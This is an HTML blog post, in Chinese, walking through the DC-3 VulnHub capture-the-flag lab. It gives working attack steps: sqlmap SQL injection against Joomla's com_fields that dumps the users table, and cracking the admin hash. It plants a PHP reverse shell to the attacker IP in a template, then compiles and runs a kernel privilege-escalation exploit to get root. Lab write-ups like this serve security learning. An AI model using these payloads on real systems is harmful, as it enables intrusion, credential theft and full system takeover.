@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="想有双手">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DC-3靶场渗透0x01 靶场简介原文DC-3是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。 与以前的DC版本一样，这一个是为初学者设计的，尽管这一次，只有一个标志，一个入口点，根本没有线索。 Linux技能和熟悉Linux命令行是必须的，因为是一些基本的渗透测试工具的经验。 对于初学者，谷歌可以提供很大的帮助，但你可以随时在@DCAU7上向我发送推文，以获得帮助，让你再次前进。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-3">
+<meta property="og:url" content="http://example.com/2023/09/06/DC-3/index.html">
+<meta property="og:site_name" content="Ice  Age">
+<meta property="og:description" content="DC-3靶场渗透0x01 靶场简介原文DC-3是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。 与以前的DC版本一样，这一个是为初学者设计的，尽管这一次，只有一个标志，一个入口点，根本没有线索。 Linux技能和熟悉Linux命令行是必须的，因为是一些基本的渗透测试工具的经验。 对于初学者，谷歌可以提供很大的帮助，但你可以随时在@DCAU7上向我发送推文，以获得帮助，让你再次前进。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/1.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/2.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/3.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/4.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/5.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/6.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/7.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/8.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/9.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/10.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/11.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/12.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/Blog/blo13.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/14.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/15.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/16.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/sts%5CDC-3%5C17.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/18.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/19.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/21.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/20.png">
+<meta property="og:image" content="http://example.com/2023/09/06/DC-3/22.png">
+<meta property="article:published_time" content="2023-09-06T00:39:52.000Z">
+<meta property="article:modified_time" content="2023-09-07T07:49:43.597Z">
+<meta property="article:author" content="想有双手">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/09/06/DC-3/1.png">
+  
+  
+  
+  <title>DC-3 - Ice  Age</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC-3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-06 08:39" pubdate>
+          2023年9月6日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC-3</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DC-3靶场渗透"><a href="#DC-3靶场渗透" class="headerlink" title="DC-3靶场渗透"></a>DC-3靶场渗透</h1><h2 id="0x01-靶场简介原文"><a href="#0x01-靶场简介原文" class="headerlink" title="0x01 靶场简介原文"></a>0x01 靶场简介原文</h2><p>DC-3是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
+<p>与以前的DC版本一样，这一个是为初学者设计的，尽管这一次，只有一个标志，一个入口点，根本没有线索。</p>
+<p>Linux技能和熟悉Linux命令行是必须的，因为是一些基本的渗透测试工具的经验。</p>
+<p>对于初学者，谷歌可以提供很大的帮助，但你可以随时在@DCAU7上向我发送推文，以获得帮助，让你再次前进。但请注意：我不会给予你答案，相反，我会给你一个关于如何前进的想法。</p>
+<p>对于那些有CTF和Boot2Root挑战经验的人来说，这可能不会花你很长时间（事实上，它可能会花你不到20分钟）。</p>
+<p>如果是这样的话，如果你想让它更有挑战性，你总是可以重做挑战，并探索其他获得root和获得标志的方法。</p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本次环境为NAT下</p>
+<p>攻击机为kali，IP：192.168.86.129</p>
+<p>靶机<a target="_blank" rel="noopener" href="https://www.five86.com/downloads/DC-3VM.zip">下载（VM版）</a></p>
+<p>用vmware打开即可</p>
+<h2 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h2><h3 id="1-寻找目标ip"><a href="#1-寻找目标ip" class="headerlink" title="1.寻找目标ip"></a>1.寻找目标ip</h3><p>老套路</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.86.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>dc-3的ip为192.168.86.167</p>
+<h3 id="2-扫描开放端口"><a href="#2-扫描开放端口" class="headerlink" title="2.扫描开放端口"></a>2.扫描开放端口</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.86.167</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>80端口开放</p>
+<h3 id="3-访问web页面"><a href="#3-访问web页面" class="headerlink" title="3.访问web页面"></a>3.访问web页面</h3><p><img src="3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>这一次，只有一个flag，一个入口，没有任何线索。</p>
+<p>要获得flag，显然必须获得root权限。</p>
+<p>你如何获取root权限取决于你–当然，还有系统。</p>
+<p>祝你好运–我希望你喜欢这个小挑战。 :-)</p>
+<p>与此同时，发现网页的cms是Joomla</p>
+<h3 id="4-后台扫描"><a href="#4-后台扫描" class="headerlink" title="4.后台扫描"></a>4.后台扫描</h3><p>用御剑扫一下后台</p>
+<p><img src="4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p>只有第一个能正常访问，是登录页面</p>
+<p><img src="5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<h3 id="5-寻找漏洞"><a href="#5-寻找漏洞" class="headerlink" title="5.寻找漏洞"></a>5.寻找漏洞</h3><p>由于不知道Joomla版本，所以先用goby看看有漏洞没</p>
+<p><img src="6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p>有sql注入漏洞</p>
+<h3 id="6-利用漏洞"><a href="#6-利用漏洞" class="headerlink" title="6.利用漏洞"></a>6.利用漏洞</h3><p>既然有sql注入，就用sqlmap吧</p>
+<p>sqlmap参数：</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>–level&#x3D;LEVEL</td>
+<td>要执行的测试级别（1-5，默认为1，5级payload最多）</td>
+</tr>
+<tr>
+<td>–risk&#x3D;RISK</td>
+<td>执行测试的风险（1-3，默认值为1，3级最高危）</td>
+</tr>
+<tr>
+<td>–random-agent</td>
+<td>使用随机选择的HTTP U-A头</td>
+</tr>
+<tr>
+<td>–dbs</td>
+<td>查询所有库</td>
+</tr>
+</tbody></table>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7c,substring(database(),1,10),0x7c),0x7c)&quot; --risk=3 --level=5 --dbs --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure>
+
+<p><img src="7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p>找到五个库，根据刚刚goby给出的url，看一下现在用的库名</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)<br></code></pre></td></tr></table></figure>
+
+<p><img src="8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<p>库名是<code>joomladb</code>，看一下这个库里的表</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)&quot; -D &quot;joomladb&quot; --tables --risk=3 --level=5 --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure>
+
+<p><img src="9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p>表挺多，但显然users表更重要一点</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns --risk=3 --level=5 --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure>
+
+<p><img src="10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
+<p>第一个位置选1或者直接回车都行，选2要指定字典路径</p>
+<p>第二个箭头指定线程，这里用最大10线程</p>
+<p>看到有name和password，查一下</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  --risk=3 --level=5 --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure>
+
+<p><img src="11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
+<p>就一个用户，是admin，但是密码是加密过的</p>
+<p><img src="12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
+<p>把密文写进password，用john解密，得到密码是snoopy</p>
+<p>可以登陆后台了</p>
+<p><img src="Blog\blo13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
+<p>“最近的请求被拒绝，因为它包含无效的安全令牌。请刷新页面，然后重试。”</p>
+<p>那重新登试试：<br><img src="14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
+<p>啊这</p>
+<p>搞了半天以为虚拟机有问题，结果是我的问题，直接访问extensions的上传文件的功能点就行了</p>
+<p>在此路径下写一句话，保存</p>
+<p><img src="15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
+<p>这里有的教程直接给出了路径，不知道是猜的还是咋的，这里用另一种方法</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade">当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。<br><span class="hljs-symbol">$soc</span>k = fsockopen(<span class="hljs-string">&quot;192.168.86.129&quot;</span>, <span class="hljs-string">&quot;5555&quot;</span>);<br><br><span class="hljs-symbol">$descriptorspec</span> = <span class="hljs-built_in">array</span>(<br><br>        <span class="hljs-number">0</span> =&gt; <span class="hljs-symbol">$soc</span>k,<br><br>        <span class="hljs-number">1</span> =&gt; <span class="hljs-symbol">$soc</span>k,<br><br>        <span class="hljs-number">2</span> =&gt; <span class="hljs-symbol">$soc</span>k<br><br>);<br><br><span class="hljs-symbol">$process</span> = proc_open(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-symbol">$descriptorspec</span>, <span class="hljs-symbol">$pipes</span>);<br><br>proc_close(<span class="hljs-symbol">$process</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
+<p>保存，访问index.php，同时kali监听5555端口</p>
+<p><img src="sts%5CDC-3%5C17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
+<p>拿到shell，看一下当前用户权限及系统版本</p>
+<p><img src="18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
+<p>上网搜一下，可以找到该系统为Ubuntu 16.04，看一下这个系统版本有没有漏洞</p>
+<p><img src="19.png" srcset="/img/loading.gif" lazyload alt="19"></p>
+<p>39772.txt可以用于本次渗透，用已经拿到的shell把poc下载到靶机中</p>
+<p>但是总是下载失败，两个思路，其一是下载到自己电脑上，然后用现成的shell，通过wget命令下载，另一种方法是再传一个一句话的shell，通过蚁剑上传上去，这里选后者</p>
+<p>39772.txt中写着poc的地址，下载</p>
+<p><img src="21.png" srcset="/img/loading.gif" lazyload alt="21"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tlab.com<span class="hljs-regexp">/exploit-database/</span>exploitdb-bin-sploits<span class="hljs-regexp">/-/</span>raw<span class="hljs-regexp">/main/</span>bin-sploits/<span class="hljs-number">39772</span>.zip<br></code></pre></td></tr></table></figure>
+
+<p>下载之后直接传上去</p>
+<p><img src="20.png" srcset="/img/loading.gif" lazyload alt="20"></p>
+<p>然后用拿到的shell解压缩</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">unzip 39772.<span class="hljs-keyword">zip</span>        <br><span class="hljs-keyword">cd</span> 39772               <br>tar -xvf exploit.tar    <br><span class="hljs-keyword">cd</span> ebpf_mapfd_doubleput_exploit<br></code></pre></td></tr></table></figure>
+
+<p>看着有点费劲，获取交互式shell</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>上面箭头给出了用法，直接利用就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure>
+
+<p>敲完命令稍等一下，就看到&#x2F;root下的flag了</p>
+<p><img src="22.png" srcset="/img/loading.gif" lazyload alt="22"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DC-3</div>
+      <div>http://example.com/2023/09/06/DC-3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>想有双手</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/19/DC-2/" title="DC-2">
+                        <span class="hidden-mobile">DC-2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
